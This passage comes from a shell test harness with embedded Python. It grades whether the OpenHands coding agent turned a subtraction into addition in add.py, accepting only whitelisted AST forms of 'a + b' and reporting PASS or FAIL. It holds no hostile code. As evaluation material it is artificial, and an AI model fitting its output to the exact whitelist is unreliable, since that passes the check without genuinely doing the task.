    sys.exit(1)


def _is_ab(nodes):
    """True iff `nodes` are two Names whose ids are exactly {a, b}."""
    if len(nodes) != 2:
        return False
    if not all(isinstance(n, ast.Name) for n in nodes):
        return False
    return {n.id for n in nodes} == {"a", "b"}


def _matches_whitelist(node):
    # a + b  or  b + a
    if (
        isinstance(node, ast.BinOp)
        and isinstance(node.op, ast.Add)
        and _is_ab([node.left, node.right])
    ):
        return "BinOp(Add, a, b)"
    # sum([a, b]) / sum((a, b)) — sum with 1 positional list/tuple arg
    if (
        isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id == "sum"
        and len(node.args) == 1
        and isinstance(node.args[0], (ast.List, ast.Tuple))
        and _is_ab(node.args[0].elts)
        and not node.keywords
    ):
        return "Call(sum([a, b]))"
    # Codex #1048 round-5 finding #2 (BLOCKING): the previous whitelist
    # also accepted ``operator.add(a, b)`` without requiring ``import
    # operator`` at module top level, so OpenHands could produce a file
    # that passed the harness but ``NameError``'d when actually used.
    # Dropped the ``operator.add`` branch — keeping only the two builtin
    # forms — rather than layering import-validation logic for a
    # semantic equivalent that the LLM has no reason to emit when the
    # prompt is "change '-' to '+' in the return statement".
    return None


match = _matches_whitelist(expr)
if match is None:
    # Best-effort string preview of the offending expression for
    # diagnostics without evaluating it.
    try:
        preview = ast.unparse(expr)
    except Exception:  # noqa: BLE001 — very old Python
        preview = ast.dump(expr, annotate_fields=False)
    print(
        f"[correctness] AST-ERROR: return expression not in semantic-add "
        f"whitelist: {preview}",
        file=sys.stderr,
    )
    sys.exit(1)

print(f"[correctness] OK: return expression matches whitelist form: {match}")
sys.exit(0)
PYEOF
then
    echo "[test_openhands.sh] FAIL: add.py correctness check failed" >&2
    echo "--- final add.py ---" >&2
    cat "$WORKDIR/add.py" >&2
    exit 3
fi

echo "[test_openhands.sh] PASS: add.py return expression is semantic add"
exit 0
